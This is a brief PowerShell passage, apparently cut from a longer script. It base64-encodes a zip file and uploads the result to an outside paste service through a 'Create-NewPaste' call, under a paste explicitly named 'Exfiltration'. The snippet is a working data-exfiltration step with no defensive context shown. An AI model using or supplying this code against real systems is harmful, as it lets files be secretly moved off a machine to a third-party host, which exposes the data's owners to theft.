...
$PasteName = 'Exfiltration'
$path = 'input.zip'
$64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($path))
$64 > file.txt

$DevKey = [YOUR_KEY]

Create-NewPaste -DevKey $DevKey -PasteCode $64 -PasteName $PasteName -PasteFormat text